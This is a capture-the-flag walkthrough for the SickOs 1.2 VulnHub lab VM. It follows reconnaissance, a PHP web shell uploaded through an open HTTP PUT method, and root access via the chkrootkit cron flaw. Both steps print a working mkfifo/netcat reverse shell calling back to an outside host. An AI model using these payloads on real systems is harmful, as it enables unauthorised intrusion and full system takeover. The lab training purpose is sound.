## SickOs 1.2 VulnHub VM walkthrough

SickOs 1.2 by https://twitter.com/sayli_ambure

Link: https://www.vulnhub.com/entry/sickos-12,144/

```
This is second in following series from SickOs and is independent of the prior releases, scope of challenge is to gain highest privileges on the system.
```

## Solution

#### Sudo Netdiscover
![](Assets/1.png)
> IP address: 192.168.1.8

#### Port scan: Nmap -sC -sV -Pn -p- -A 192.168.1.8
![](Assets/2.png)
> OpenSSH 5.9p1 & lighthttpd 1.4.28

#### Nikto: Nikto -h 192.168.1.8
![](Assets/3.png)
> nothing interesting

#### Dirb http://192.168.1.8
![](Assets/4.png)
> test and index.php

#### Visit test directory
![](Assets/5.png)

#### Check curl methods: curl -v -X OPTIONS http://192.168.1.8/test
![](Assets/6.png)
> notice PUT method

#### Intercept http://192.168.1.8/test in burp and try creating a file with PUT
![](Assets/7.png)
> 'x' created

#### Check with curl http://192.168.1.8/test/x
![](Assets/8.png)
> Got the content

#### Add reverse shell and Note that the outbound traffic except port 443 is blocked by Firewall, so in reverse shell, use port 443
```
<?php echo shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.43.2 443 >/tmp/f"); ?>
```
![](Assets/9.png)
> shell created
![](Assets/10.png)
> got shell access

#### Spawn tty shell
![](Assets/11.png)

### Method: Using Chkrootkit
#### Check cron.daily
![](Assets/12.png)
> chkrootkit 0.49 version vulnerable to local privilege escalation
> put malicious code in /tmp/update and wait for cron.daily to execute it
```
echo '#!/bin/bash' > update
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.43.2 443 >/tmp/f' >> update 
chmod 777 update
```
![](Assets/13.png)

#### Nc -nvlp 443
![](Assets/14.png)
> Got root
